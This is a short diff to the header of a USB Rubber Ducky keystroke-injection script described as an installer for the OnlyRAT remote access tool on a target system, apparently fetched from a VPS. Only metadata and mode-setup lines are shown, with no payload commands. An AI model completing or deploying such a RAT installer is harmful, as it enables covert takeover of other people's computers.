@@ -1,6 +1,6 @@
 REM TITLE OnlyRat Installer
-REM AUTHOR BlueCosmo
-REM DESCRIPTION Installs Onlyrat on a target system
+REM OnlyRAT installer via the USB Rubber Ducky [FROM VPS]
+REM AUTHOR C0SM0
 
 ATTACKMODE HID
 EXTENSION DETECT_READY
